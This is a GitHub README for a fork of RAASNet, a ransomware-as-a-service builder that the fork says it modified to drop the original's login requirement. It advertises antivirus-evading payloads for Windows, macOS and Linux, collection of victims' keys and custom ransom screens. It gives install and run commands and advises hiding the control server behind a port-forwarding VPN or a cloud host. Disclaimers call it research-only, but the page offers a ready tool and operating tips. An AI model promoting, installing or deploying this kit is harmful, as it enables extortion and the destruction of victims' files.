<h1 align="center">
   RAASNet
</h1>

This repository was forked from [CesarAyalaDev/RAASNet](https://github.com/CesarAyalaDev/RAASNet) and modified to avoid the required login, and to work with the newest version of Pillow

<p align="center">
  Ransomware As A Service
</p>

![alt text](./demo/MainMenu.PNG)
![alt text](./demo/CreatePayload.PNG)
![alt text](./demo/Compile.PNG)
![alt text](./demo/Alert.PNG)

<br>

<h1 align="center">
   Please read, description by the original author
</h1>
<br>
<p align=center>
   This project was made to demonstrate how easy ransomware are easy to make and how it work. The script works on Windows, Linux and MacOS. It is recommended to compile payload.py to EXE format to make it more portable.
</p>

<p align=center>
   I do work on security awareness trainings and test the IT security and safety for other companies and you guessed it; this was made for the demo section of my presentation, NOT TO EARN MONEY OR BRICK PEOPLES COMPUTERS.
</p>

<p align=center>
   This script does not get detected by any anti-virusses. Self made scripts go undetected 99% of the time. It's easy to write something nasty like ransomware, adware, malware, you name it. Again, this script was for research only. Not ment to be used in the open world. I am not responsible for any damage you may cause with this knowledge. 
</p>

<p align=center>
   I recommend using a VPN that allows port forwarding (For example; PIA VPN) when using this outside your network, or better, a cloud computer hosted elsewhere, like Amazon AWS. 
</p>

<p align=center>
   The conclusion of this project is that it is easy to brick a system and earn money doing it. This script doesn't use any exploits to achieve its goal, but can easily be coded into it as a nice feature.
</p>
<br>

<h1 align="center">
   Features
</h1>
<br>

+ Generate a ransomware payload
+ With or without GUI payload
+ FUD (Fully Undetectable by Anti-Virus)
+ Works on Windows, MacOS and Linux
+ Super fast encryption with PyCrypto
+ Compile to EXE, APP or Unix/Linux executable
+ Custom icon for your EXE payload
+ Receive keys of victims
+ Decrypt files
+ Demo mode (payload won't encrypt anything)
+ Fullscreen mode (Warning takes over the screen)
+ Custom warning message for your victim
+ Custom image in your payload
+ Ghost mode (Rename by adding .DEMON extention instead of encrypting the files)
+ Multiple encryption methods
+ Select file extentions to target
+ Decide if payload should self-destruct (Console mode feature only)
+ Decide wich drive to target for encryption (working directory)
+ Verified server access through port forwarding VPN
+ Encode payload as Morse code

<h1 align="center">
   Installation
</h1>

Download and install the latest version of Python 3.<br>
<br>
Then do:<br>
```Shell
git clone https://github.com/Dev-Lj/RAASNet.git
```

```Shell
pip3 install -r requirements.txt
```

```Shell
python3 RAASNet.py
```

On Linux, you might need to install these packages (untested):
```Shell
sudo apt install python3-tk python3-pil python3-pil.imagetk
```

Testing connection with remote server (untested):
```Shell
# Change the host and port in test_socket.py, default is 127.0.0.1 on port 8989
python3 test_socket.py
```


----
# Disclaimer
I am not responsible for any damage you might cause with this tool. Use at own risk and for testing and learning only! I made this to test AV's and demo purposes only! Use this to avoid ransomware and make better tools against it because current AV tools and ransomware shields are not good enough!
